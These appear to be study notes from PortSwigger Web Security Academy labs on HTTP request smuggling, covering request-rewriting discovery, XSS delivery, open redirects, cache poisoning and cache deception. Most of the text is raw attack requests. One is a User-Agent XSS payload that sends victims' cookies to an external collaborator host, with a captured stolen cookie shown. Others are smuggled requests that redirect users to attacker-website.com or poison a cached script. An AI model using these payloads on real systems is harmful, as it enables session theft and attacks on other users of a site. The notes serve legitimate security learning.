### Revealing front-end request rewriting
In many applications, the front-end server modifies incoming requests before sending them to the back-end server by adding additional request headers. For instance, it may:

    Terminate the TLS connection and include headers describing the protocol and ciphers used.
    Add an X-Forwarded-For header with the user's IP address.
    Determine the user's ID from their session token and include a corresponding header.
    Add sensitive information relevant for certain attacks.

In some cases, if your smuggled requests lack headers typically added by the front-end server, the back-end server may not process them as expected, causing the smuggled requests to fail in achieving their intended objectives.

You can often uncover how the front-end server alters requests by following these steps:

    Identify a POST request that reflects a request parameter's value in the application's response.
    Rearrange the parameters so that the reflected parameter is the last one in the message body.
    Send this modified request to the back-end server, immediately followed by a regular request whose modified form you aim to reveal.

```
- wait for another user to make a request and you will find a comment with their request
```http

### reflected XSS to Stored XSS
```
1)It requires no interaction with victim users.
2)You don't need to feed them a URL and wait for them to visit it,
You just smuggle a request containing the XSS payload and the next user's request that is processed by the back-end server will be hit.
3)It can be used to exploit XSS behavior in parts of the request that cannot be trivially controlled in a normal reflected XSS attack, such as HTTP request headers.
```

- request
```http
POST / HTTP/1.1
Host: 0a6000ba044f324f82b0c961008a0018.web-security-academy.net

User-Agent: "><script>location='http://awapn15squ47vsk973cd1d7xjopfd51u.oastify.com/?cookies='+document.cookie</script>
Content-Length: 40


```
- wait another user to make a request then the script will run on their browser (in our case send cookies to our server)
```http
GET /?cookies=secret=TeQVKzAQmjAvw0Fy5ZYRR2nQJVNYXbKX HTTP/1.1

```
### Turn an on-site redirect into an open redirect
Many applications perform on-site redirects from one URL to another and place the hostname from the request's Host header into the redirect URL. 
**An example** of this is the default behavior of Apache and IIS web servers, where a request for a folder without a trailing slash receives a redirect to the same folder including the trailing slash:
```http
GET /home HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
NOTE: if the user's request was for a JavaScript. The attacker can fully compromise the victim user by returning their own JavaScript in the response. 

- response
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
- wait for another to make a request then will be redirected 
```http
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
### Turning root-relative redirects into open redirects
```
1)In some cases, you may encounter server-level redirects that use the path to construct a root-relative URL
2)This can potentially still be used for an open redirect if the server lets you use a protocol-relative URL in the path
```
NOTE : if the user's request was for a JavaScript. The attacker can fully compromise the victim user by returning their own JavaScript in the response. 

- request
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET //attacker-website.com/example HTTP/1.1
Host: vulnerable-website.com

```
- wait for another to make a request then will be redirected
```http
HTTP/1.1 301 Moved Permanently
Location: //attacker-website.com/example/
```

### Perform web cache poisoning
1) search for : 
    - [Turn an on-site redirect into an open redirect](#turn-an-on-site-redirect-into-an-open-redirect)
    - [Turning root-relative redirects into open redirects](#turning-root-relative-redirects-into-open-redirects)
    - Open Redirect

2) Search for **static files** or **pages** that **web cached**
3) Send a smuggled request that will cause a redirect
4) follow it with the static file or page that will be cached
```
explain:
The smuggled request reaches the back-end server, which responds as before with the off-site redirect.
when you send static file or page that will be cached The front-end server caches this response against what it believes is the URL in the second request 
```
**EX:**
- send smuggled request
```http
POST / HTTP/1.1
Host: 0a4b001603fa601c84288b25008c0095.web-security-academy.net

Content-Length: 10

```
- send the file that will be cached
```http
GET /resources/js/tracking.js HTTP/1.1
Host: 0a4b001603fa601c84288b25008c0095.web-security-academy.net
```
- check that it is chached and Location to your server 
```http
HTTP/1.1 302 Found
Location: https://exploit-0a610039035b603c84078a7c01ca002a.exploit-server.net/exploit?test=/post?postId=3
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30

X-Cache: hit
Connection: close
```
- the response that contain your evil script
```http
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
Server: Academy Exploit Server
Content-Length: 22

alert(document.cookie)
```
### Perform web cache deception
**web cache deception**:the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache. 
- request that returns some sensitive user-specific content
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 43
Transfer-Encoding: chunked

0

GET /private/messages HTTP/1.1
Foo: X
```
- The next request from another user that is forwarded to the back-end server will be appended to the smuggled request, including session cookies and other headers
- The front-end server caches this response against what it believes is the URL in the second request, which is /static/some-image.png
```http
GET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 200 Ok
...
<h1>Your private messages</h1>
...
```
